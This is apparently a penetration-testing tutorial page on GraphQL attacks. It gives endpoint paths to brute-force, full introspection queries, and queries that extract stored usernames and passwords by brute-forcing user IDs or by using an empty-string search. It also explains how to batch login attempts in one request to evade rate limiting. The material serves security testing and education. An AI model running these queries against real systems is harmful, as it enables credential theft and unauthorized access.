GraphQL
Introduction

GraphQL is a data query language developed by Facebook and was released in 2015. GraphQL acts as an alternative to REST API. Rest APIs require the client to send multiple requests to different endpoints on the API to query data from the backend database. With graphQL you only need to send one request to query the backend. This is a lot simpler because you don’t have to send multiple requests to the API, a single request can be used to gather all the necessary information.
GraphQL

As new technologies emerge so will new vulnerabilities. By default graphQL does not implement authentication, this is put on the developer to implement. This means by default graphQL allows anyone to query it, any sensitive information will be available to attackers unauthenticated.

When performing your directory brute force attacks make sure to add the following paths to check for graphQL instances.

    /graphql

    /graphiql

    /graphql.php

    /graphql/console

Once you find an open graphQL instance you need to know what queries it supports. This can be done by using the introspection system, more details can be found here: GraphQL: A query language for APIs.
It’s often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so…graphql.org​
Basic Enumeration

Graphql usually supports GET, POST (x-www-form-urlencoded) and POST(json).
query={__schema{types{name,fields{name}}}}

With this query you will find the name of all the types being used:
query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}

With this query you can extract all the types, it's fields, and it's arguments (and the type of the args). This will be very useful to know how to query the database.
Errors

It's interesting to know if the errors are going to be shown as they will contribute with useful information.

?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}

Enumerate Database Schema via Introspection

fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}

The last code line is a graphql query that will dump all the meta-information from the graphql (objects names, parameters, types...)
Quering

Now that we know which kind of information is saved inside the database, let's try to extract some values.

In our example there were 2 objects inside the "Query" type object: "user" and "users".
If these objects don't need any argument to search, could retrieve all the information from them just asking for the data you want. In this example from Internet you could extract the saved usernames and passwords:

However, in this example if you try to do so you get this error:

Looks like somehow it will search using the "uid" argument of type Int.
Anyway, we already knew that, in the Basic Enumeration section a query was purposed that was showing us all the needed information: query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}

If you read the image provided when I run that query you will see that "user" had the arg "uid" of type Int.

So, performing some light uid bruteforce I found that in uid=1 a username and a password was retrieved:
query={user(uid:1){user,password}}

Note that I discovered that I could ask for the parameters "user" and "password" because if I try to look for something that doesn't exist (query={user(uid:1){noExists}}) I get this error:

And during the enumeration phase I discovered that the "dbuser" object had as fields "user" and "password.
Query string dump trick (thanks to @BinaryShadow_)

If you can search by a string type, like: query={theusers(description: ""){username,password}} and you search for an empty string it will dump all data. (Note this example isn't related with the example of the tutorials, for this example suppose you can search using "theusers" by a String field called "description").

GraphQL is a relatively new technology that is starting to gain some traction among startups and large corporations. Other than missing authentication by default graphQL endpoints can be vulnerable to other bugs such as IDOR.
Batching brute-force in 1 API request

This information was take from https://lab.wallarm.com/graphql-batching-attack/.
Authentication through GraphQL API with simultaneously sending many queries with different credentials to check it. It’s a classic brute force attack, but now it’s possible to send more than one login/password pair per HTTP request because of the GraphQL batching feature. This approach would trick external rate monitoring applications into thinking all is well and there is no brute-forcing bot trying to guess passwords.

Below you can find the simplest demonstration of an application authentication request, with 3 different email/passwords pairs at a time. Obviously it’s possible to send thousands in a single request in the same way:

 As we can see from the response screenshot, the first and the third requests returned null and reflected the corresponding information in the error section. The second mutation had the correct authentication data and the response has the correct authentication session token.
Tools
GraphQL IDE | Insomnia
Leading Open Source API Client, and Collaborative API Design Platform for GraphQL, and REST
insomnia.rest
graphql/graphiql
GraphiQL & the GraphQL LSP Reference Ecosystem for building browser & IDE tools. - graphql/graphiql
github.com
swisskyrepo/GraphQLmap
GraphQLmap is a scripting engine to interact with a graphql endpoint for pentesting purposes. - swisskyrepo/GraphQLmap
github.com

Burp extension and tool: 
Altair GraphQL Client
A beautiful feature-rich GraphQL Client IDE for all platforms. Enables you interact with any GraphQL server you are authorized to access from any platform you are on. Much like Postman for GraphQL, you can easily test and optimize your GraphQL implementations.
altair.sirmuel.design
InQL Scanner · Doyensec's Blog
Doyensec's Blog :: Doyensec is an independent security research and development company focused on vulnerability discovery and remediation.
blog.doyensec.com
doyensec/inql
InQL - A Burp Extension for GraphQL Security Testing - doyensec/inql
github.com
Altair GraphQL Client
A beautiful feature-rich GraphQL Client IDE for all platforms. Enables you interact with any GraphQL server you are authorized to access from any platform you are on. Much like Postman for GraphQL, you can easily test and optimize your GraphQL implementations.
altair.sirmuel.design
References

    ​https://jondow.eu/practical-graphql-attack-vectors/​

    ​https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696​

    ​https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4​

    ​http://ghostlulz.com/api-hacking-graphql/​

    ​https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.m​

    ​https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696
